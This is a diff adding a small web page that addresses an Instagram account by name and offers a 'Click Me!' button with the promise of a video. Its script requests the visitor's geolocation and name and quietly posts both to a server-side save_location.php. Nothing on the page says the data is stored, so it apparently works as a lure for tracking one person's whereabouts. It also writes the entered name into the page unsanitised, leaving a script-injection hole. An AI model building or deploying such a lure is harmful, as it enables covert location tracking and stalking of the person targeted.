@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>my friend App</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <h1>Welcome my friend </h1>
+    <p>hello @pvt.life.off </p>
+    <a href="https://www.instagram.com/pvt.life.off.1?igsh=YzljYTk1ODg3Zg==">@pvt.life.off</a>
+    <p id="para"></p>
+
+    <button id="getLocationBtn">Click Me!</button>
+    <div id="weatherInfo">
+        <!-- Information will appear here -->
+    </div>
+</body>
+</html>
+<script>
+    const div = document.getElementById('weatherInfo');
+    const button = document.getElementById('getLocationBtn');
+
+    async function saveLocationToDatabase(name, latitude, longitude) {
+        try {
+            const response = await fetch('save_location.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ name, latitude, longitude }),
+            });
+
+            if (response.ok) {
+                console.log('Location saved to database successfully!');
+            } else {
+                console.error('Failed to save location to database.');
+            }
+        } catch (error) {
+            console.error('Error while saving location:', error);
+        }
+    }
+
+    function getlocation(position) {
+        const name = prompt('Please enter your name:');
+        if (!name) {
+            console.log('Name is required to save location.');
+            return;
+        }
+
+        console.log('Location retrieved successfully!');
+        console.log('Name: ' + name);
+        console.log('@pvt.life.off: ' + position.coords.latitude);
+        console.log('my baby: ' + position.coords.longitude);
+       
+        // Save location to database
+        saveLocationToDatabase(name, position.coords.latitude, position.coords.longitude);
+document.getElementById('para').innerHTML = `
+            <h2>Thank you, ${name}!</h2>
+            <p>@pvt.life.off: ${position.coords.latitude}</p>
+            <p>my baby: ${position.coords.longitude}</p>
+        `;
+        // Show video after fetching location
+        div.innerHTML = `
+            <h2>Thank you, ${name}!</h2>
+            <p>Here is a video for you:</p>
+            <video controls width="600">
+                <source src="sample-video.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        `;
+    }
+
+    function failedtoget() {
+        console.log('Unable to retrieve your location');
+    }
+
+    button.addEventListener('click', () => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(getlocation, failedtoget);
+        } else {
+            console.log('Geolocation is not supported by this browser.');
+        }
+    });
+</script>
